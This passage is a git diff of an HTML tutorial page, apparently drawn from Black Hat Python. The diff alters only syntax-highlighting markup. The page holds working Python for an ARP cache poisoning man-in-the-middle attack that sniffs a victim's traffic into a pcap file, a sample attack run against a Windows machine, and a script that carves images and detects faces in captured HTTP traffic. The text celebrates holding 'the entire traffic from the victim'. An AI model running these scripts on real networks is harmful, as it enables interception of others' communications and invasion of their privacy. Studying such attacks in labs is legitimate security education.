         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&quot;[*] Gateway </span><span class="si">%s</span><span class="s"> is at </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">,</span> <span class="n">GATEWAY_MAC</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s2">&quot;[*] Gateway </span><span class="si">%s</span><span class="s2"> is at </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">,</span> <span class="n">GATEWAY_MAC</span><span class="p">)</span>
 
     <span class="n">TARGET_MAC</span> <span class="o">=</span> <span class="n">get_mac</span><span class="p">(</span><span class="n">TARGET_IP</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">TARGET_MAC</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&quot;[-] Failed to get target MAC. Exiting.&quot;</span>
+        <span class="k">print</span> <span class="s2">&quot;[-] Failed to get target MAC. Exiting.&quot;</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&quot;[*] Target </span><span class="si">%s</span><span class="s"> is at </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_MAC</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s2">&quot;[*] Target </span><span class="si">%s</span><span class="s2"> is at </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_MAC</span><span class="p">)</span>
 
     <span class="n">poison_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">poison_target</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">,</span> <span class="n">GATEWAY_MAC</span><span class="p">,</span> \
         <span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_MAC</span><span class="p">))</span>
     <span class="n">poison_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
 
     <span class="k">try</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&#39;[*] Starting sniffer for </span><span class="si">%d</span><span class="s"> packets&#39;</span> <span class="o">%</span><span class="n">PACKET_COUNT</span>
-        <span class="n">bpf_filter</span> <span class="o">=</span> <span class="s">&#39;IP host &#39;</span> <span class="o">+</span> <span class="n">TARGET_IP</span>
+        <span class="k">print</span> <span class="s1">&#39;[*] Starting sniffer for </span><span class="si">%d</span><span class="s1"> packets&#39;</span> <span class="o">%</span><span class="n">PACKET_COUNT</span>
+        <span class="n">bpf_filter</span> <span class="o">=</span> <span class="s1">&#39;IP host &#39;</span> <span class="o">+</span> <span class="n">TARGET_IP</span>
         <span class="n">packets</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">count</span><span class="o">=</span><span class="n">PACKET_COUNT</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">INTERFACE</span><span class="p">)</span>
-        <span class="n">wrpcap</span><span class="p">(</span><span class="s">&#39;results.pcap&#39;</span><span class="p">,</span> <span class="n">packets</span><span class="p">)</span>
+        <span class="n">wrpcap</span><span class="p">(</span><span class="s1">&#39;results.pcap&#39;</span><span class="p">,</span> <span class="n">packets</span><span class="p">)</span>
         <span class="n">restore_target</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">,</span> <span class="n">GATEWAY_MAC</span><span class="p">,</span> <span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_MAC</span><span class="p">)</span>
 
     <span class="k">except</span> <span class="n">Scapy_Exception</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
-        <span class="k">print</span> <span class="n">msg</span><span class="p">,</span> <span class="s">&quot;Hi there!!&quot;</span>
+        <span class="k">print</span> <span class="n">msg</span><span class="p">,</span> <span class="s2">&quot;Hi there!!&quot;</span>
 
     <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
         <span class="n">restore_target</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">,</span> <span class="n">GATEWAY_MAC</span><span class="p">,</span> <span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_MAC</span><span class="p">)</span>
@@ -613,45 +613,45 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 
 
 <p>To run it, we need to tell the local host machine (Kali Linux) to forward packets along both the gateway and the target IP address:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="nb">echo </span>1 /proc/sys/net/ipv4/ip_foward
+<div class="highlight"><pre><span></span>$ <span class="nb">echo</span> <span class="m">1</span> /proc/sys/net/ipv4/ip_foward
 </pre></div>
 
 
 <p>Running this in our attack machine (Kali Linux),</p>
-<div class="highlight"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">python</span> <span class="n">arp_cache_poisoning</span><span class="p">.</span><span class="n">py</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">wlp1s0</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Gateway</span> <span class="mf">192.168.1.1</span> <span class="n">is</span> <span class="n">at</span> <span class="mo">00</span><span class="o">:</span><span class="mi">90</span><span class="o">:</span><span class="n">a9</span><span class="o">:</span><span class="n">a3</span><span class="o">:</span><span class="n">f1</span><span class="o">:</span><span class="mi">46</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="mf">192.168.1.107</span> <span class="n">is</span> <span class="n">at</span> <span class="mo">00</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="mi">9</span><span class="n">c</span><span class="o">:</span><span class="n">b3</span><span class="o">:</span><span class="mi">87</span><span class="o">:</span><span class="n">c4</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Beginning</span> <span class="n">the</span> <span class="n">ARP</span> <span class="n">poison</span><span class="p">.</span> <span class="p">[</span><span class="n">CTRL</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">stop</span><span class="p">]</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">sniffer</span> <span class="k">for</span> <span class="mi">1000</span> <span class="n">packets</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ARP</span> <span class="n">poison</span> <span class="n">attack</span> <span class="n">finished</span><span class="p">.</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Restoring</span> <span class="n">targets</span><span class="p">...</span>
+<div class="highlight"><pre><span></span>$ sudo python arp_cache_poisoning.py
+<span class="o">[</span>*<span class="o">]</span> Setting up wlp1s0
+<span class="o">[</span>*<span class="o">]</span> Gateway <span class="m">192</span>.168.1.1 is at <span class="m">00</span>:90:a9:a3:f1:46
+<span class="o">[</span>*<span class="o">]</span> Target <span class="m">192</span>.168.1.107 is at <span class="m">00</span>:25:9c:b3:87:c4
+<span class="o">[</span>*<span class="o">]</span> Beginning the ARP poison. <span class="o">[</span>CTRL-C to stop<span class="o">]</span>
+<span class="o">[</span>*<span class="o">]</span> Starting sniffer <span class="k">for</span> <span class="m">1000</span> packets
+<span class="o">[</span>*<span class="o">]</span> ARP poison attack finished.
+<span class="o">[</span>*<span class="o">]</span> Restoring targets...
 </pre></div>
 
 
 <p>we see the changes in the victim's machine (Windows):</p>
-<p><img alt="" src="http://i.imgur.com/RFdIz4H.png" /></p>
+<p><img alt="" src="http://i.imgur.com/RFdIz4H.png"></p>
 <p>Now open in Wireshark the PCAP file resulting from the script. BAM! The entire traffic from the victim is in your hand!</p>
-<hr />
+<hr>
 <h2><a name="pcap"></a> PCAP Processing to Find Images</h2>
 <p>We have learned how to steal credentials from some email protocols, now let us extend this to all the traffic in the network!</p>
 <h3>Writing and Saving PCAP Files</h3>
 <p>To save packets we can use the function <strong>wrpacp</strong>:</p>
-<div class="highlight"><pre><span class="n">wrpcap</span><span class="p">(</span><span class="s">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">wrpcap</span><span class="p">(</span><span class="s1">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
 </pre></div>
 
 
 <p>To read packets we can use <strong>rdpcap</strong>:</p>
-<div class="highlight"><pre><span class="n">p</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s1">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
 </pre></div>
 
 
 <h3>Analyzing PCAP Files</h3>
 <p>Based in one of the examples from <a href="">Black Hat Python</a> we are going to analyze images from HTTP traffic dumped in a PCAP file. We can do this with the library <a href="http://opencv.org/">opencv</a>. We also need to install <a href="http://www.numpy.org/">numpy</a> and <a href="http://www.scipy.org/">scipy</a>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo pip install numpy
-<span class="nv">$ </span>sudo pip install scipy
-<span class="nv">$ </span>sudo yum install opencv-python
+<div class="highlight"><pre><span></span>$ sudo pip install numpy
+$ sudo pip install scipy
+$ sudo yum install opencv-python
 </pre></div>
 
 
@@ -659,12 +659,12 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 <a href="http://wiki.wireshark.org/SampleCaptures">here</a>, <a href="http://www.netresec.com/?page=PcapFiles">here</a>, <a href="http://www.pcapr.net/home">here</a>, and <a href="http://www.pcapr.net/browse?q=facebook+AND+png">here</a>.</p>
 <p>The following script does the following:</p>
 <p>1) The function <strong>http_assembler</strong> takes a PCAP and separates each TCP session in a dictionary. Then it loops in these section using the HTTP filter (which is the same as <em>Follow the TCP stream</em> in Wireshark). After the HTTP data is assembled, it parses the headers with the <strong>get_http_headers</strong> function and send to the <strong>extract_image</strong> function. If the image header are returned, it saves the image and try to detect faces with the function <strong>face_detect</strong>.</p>
-<div class="highlight"><pre><span class="k">def</span> <span class="nf">http_assembler</span><span class="p">(</span><span class="n">PCAP</span><span class="p">):</span>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">http_assembler</span><span class="p">(</span><span class="n">PCAP</span><span class="p">):</span>
     <span class="n">carved_images</span><span class="p">,</span> <span class="n">faces_detected</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
     <span class="n">p</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="n">PCAP</span><span class="p">)</span>
     <span class="n">sessions</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">sessions</span><span class="p">()</span>
     <span class="k">for</span> <span class="n">session</span> <span class="ow">in</span> <span class="n">sessions</span><span class="p">:</span>
-        <span class="n">http_payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+        <span class="n">http_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
         <span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">sessions</span><span class="p">[</span><span class="n">session</span><span class="p">]:</span>
             <span class="k">try</span><span class="p">:</span>
                 <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">80</span> <span class="ow">or</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span> <span class="o">==</span> <span class="mi">80</span><span class="p">:</span>
@@ -675,17 +675,17 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
             <span class="k">if</span> <span class="n">headers</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                 <span class="k">continue</span>
 
-            <span class="c"># extract the raw image and return the image type and the binary body of</span>
-            <span class="c"># the image itself</span>
+            <span class="c1"># extract the raw image and return the image type and the binary body of</span>
+            <span class="c1"># the image itself</span>
             <span class="n">image</span><span class="p">,</span> <span class="n">image_type</span> <span class="o">=</span> <span class="n">extract_image</span><span class="p">(</span><span class="n">headers</span><span class="p">,</span> <span class="n">http_payload</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">image</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">image_type</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
-                <span class="n">file_name</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s">-pic_carver_</span><span class="si">%d</span><span class="s">.</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">PCAP</span><span class="p">,</span> <span class="n">carved_images</span><span class="p">,</span> <span class="n">image_type</span><span class="p">)</span>
-                <span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s">/</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">PIC_DIR</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span>
+                <span class="n">file_name</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">-pic_carver_</span><span class="si">%d</span><span class="s1">.</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">PCAP</span><span class="p">,</span> <span class="n">carved_images</span><span class="p">,</span> <span class="n">image_type</span><span class="p">)</span>
+                <span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">PIC_DIR</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
                 <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
                 <span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                 <span class="n">carved_images</span> <span class="o">+=</span> <span class="mi">1</span>
                 <span class="k">try</span><span class="p">:</span>
-                    <span class="n">result</span> <span class="o">=</span> <span class="n">face_detect</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s">/</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">PIC_DIR</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="n">file_name</span><span class="p">)</span>
+                    <span class="n">result</span> <span class="o">=</span> <span class="n">face_detect</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">PIC_DIR</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="n">file_name</span><span class="p">)</span>
                     <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
                         <span class="n">faces_detected</span> <span class="o">+=</span> <span class="mi">1</span>
                 <span class="k">except</span><span class="p">:</span>
@@ -697,13 +697,13 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 <ol>
 <li>The <strong>get_http_headers</strong> function split the headers using regex to find <strong>'Content-Type'</strong>:</li>
 </ol>
-<div class="highlight"><pre><span class="k">def</span> <span class="nf">get_http_headers</span><span class="p">(</span><span class="n">http_payload</span><span class="p">):</span>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_http_headers</span><span class="p">(</span><span class="n">http_payload</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">headers_raw</span> <span class="o">=</span> <span class="n">http_payload</span><span class="p">[:</span><span class="n">http_payload</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
-        <span class="n">headers</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;(?P&lt;name&gt;.*?):(?P&lt;value&gt;.*?)\r\n&#39;</span><span class="p">,</span> <span class="n">headers_raw</span><span class="p">))</span>
+        <span class="n">headers_raw</span> <span class="o">=</span> <span class="n">http_payload</span><span class="p">[:</span><span class="n">http_payload</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(?P&lt;name&gt;.*?):(?P&lt;value&gt;.*?)\r\n&#39;</span><span class="p">,</span> <span class="n">headers_raw</span><span class="p">))</span>
     <span class="k">except</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">None</span>
-    <span class="k">if</span> <span class="s">&#39;Content-Type&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
+    <span class="k">if</span> <span class="s1">&#39;Content-Type&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">None</span>
     <span class="k">return</span> <span class="n">headers</span>
 </pre></div>
@@ -712,17 +712,17 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 <ol>
 <li>The <strong>extract_image</strong> function determine whether an image is in a HTTP response by checking by the <strong>'Content-Type'</strong> string.</li>
 </ol>
-<div class="highlight"><pre><span class="k">def</span> <span class="nf">extract_image</span><span class="p">(</span><span class="n">headers</span><span class="p">,</span> <span class="n">http_payload</span><span class="p">):</span>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">extract_image</span><span class="p">(</span><span class="n">headers</span><span class="p">,</span> <span class="n">http_payload</span><span class="p">):</span>
     <span class="n">image</span><span class="p">,</span><span class="n">image_type</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="k">if</span> <span class="s">&#39;image&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="s">&#39;Content-Type&#39;</span><span class="p">]:</span>
-            <span class="n">image_type</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="s">&#39;Content-Type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;/&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-            <span class="n">image</span> <span class="o">=</span> <span class="n">http_payload</span><span class="p">[</span><span class="n">http_payload</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\r\n\r\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
+        <span class="k">if</span> <span class="s1">&#39;image&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">]:</span>
+            <span class="n">image_type</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="n">image</span> <span class="o">=</span> <span class="n">http_payload</span><span class="p">[</span><span class="n">http_payload</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
             <span class="k">try</span><span class="p">:</span>
-                <span class="k">if</span> <span class="s">&#39;Content-Encoding&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
-                    <span class="k">if</span> <span class="n">headers</span><span class="p">[</span><span class="s">&#39;Content-Encoding&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;gzip&#39;</span><span class="p">:</span>
+                <span class="k">if</span> <span class="s1">&#39;Content-Encoding&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                    <span class="k">if</span> <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Encoding&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;gzip&#39;</span><span class="p">:</span>
                         <span class="n">image</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="mi">16</span><span class="o">+</span><span class="n">zlb</span><span class="o">.</span><span class="n">MAX_WBITS</span><span class="p">)</span>
-                    <span class="k">elif</span> <span class="n">headers</span><span class="p">[</span><span class="s">&#39;Content-Encoding&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;deflate&#39;</span><span class="p">:</span>
+                    <span class="k">elif</span> <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Encoding&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;deflate&#39;</span><span class="p">:</span>
                         <span class="n">image</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
             <span class="k">except</span><span class="p">:</span>
                 <span class="k">pass</span>
@@ -735,28 +735,28 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 <ol>
 <li>Finally, the <strong>face_detect</strong> function uses the <strong>opencv</strong> library to apply a classifier that is trained for detecting faces. It returns a rectangle coordinates to where the face is and saves the final image. Several types of image classifiers can be found <a href="http://alereimondo.no-ip.org/OpenCV/34">here</a>.</li>
 </ol>
-<div class="highlight"><pre><span class="k">def</span> <span class="nf">face_detect</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">file_name</span><span class="p">):</span>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">face_detect</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">file_name</span><span class="p">):</span>
     <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
-    <span class="n">cascade</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">CascadeClassifier</span><span class="p">(</span><span class="s">&#39;/home/bytegirl/Desktop/haarcascade_upperbody.xml&#39;</span><span class="p">)</span>
+    <span class="n">cascade</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">CascadeClassifier</span><span class="p">(</span><span class="s1">&#39;/home/bytegirl/Desktop/haarcascade_upperbody.xml&#39;</span><span class="p">)</span>
     <span class="n">rects</span> <span class="o">=</span> <span class="n">cascade</span><span class="o">.</span><span class="n">detectMultiScale</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cv</span><span class="o">.</span><span class="n">CV_HAAR_SCALE_IMAGE</span><span class="p">,</span> <span class="p">(</span><span class="mi">20</span><span class="p">,</span><span class="mi">20</span><span class="p">))</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">rects</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
         <span class="k">return</span> <span class="bp">False</span>
     <span class="n">rects</span><span class="p">[:,</span> <span class="mi">2</span><span class="p">:]</span> <span class="o">+=</span> <span class="n">rects</span><span class="p">[:,</span> <span class="p">:</span><span class="mi">2</span><span class="p">]</span>
     <span class="k">for</span> <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">y2</span> <span class="ow">in</span> <span class="n">rects</span><span class="p">:</span>
         <span class="n">cv2</span><span class="o">.</span><span class="n">retangle</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">),</span> <span class="p">(</span><span class="n">x2</span><span class="p">,</span> <span class="n">y2</span><span class="p">),</span> <span class="p">(</span><span class="mi">127</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span>
-        <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s">/</span><span class="si">%s</span><span class="s">-</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">FACES_DIR</span><span class="p">,</span> <span class="n">PCAP</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="n">img</span><span class="p">)</span>
+        <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/</span><span class="si">%s</span><span class="s1">-</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">FACES_DIR</span><span class="p">,</span> <span class="n">PCAP</span><span class="p">,</span> <span class="n">file_name</span><span class="p">),</span> <span class="n">img</span><span class="p">)</span>
     <span class="k">return</span> <span class="bp">True</span>
 </pre></div>
 
 
 <p>Running it results in an output like this:</p>
-<div class="highlight"><pre>Extracted: 165 images
-Detected: 16 faces
+<div class="highlight"><pre><span></span>Extracted: <span class="m">165</span> images
+Detected: <span class="m">16</span> faces
 </pre></div>
 
 
 <p>Really cool!</p>
-<hr />
+<hr>
 <h2>Further References:</h2>
 <ul>
 <li><a href="http://www.secdev.org/projects/scapy/doc/">Scapy Documentation</a>.</li>
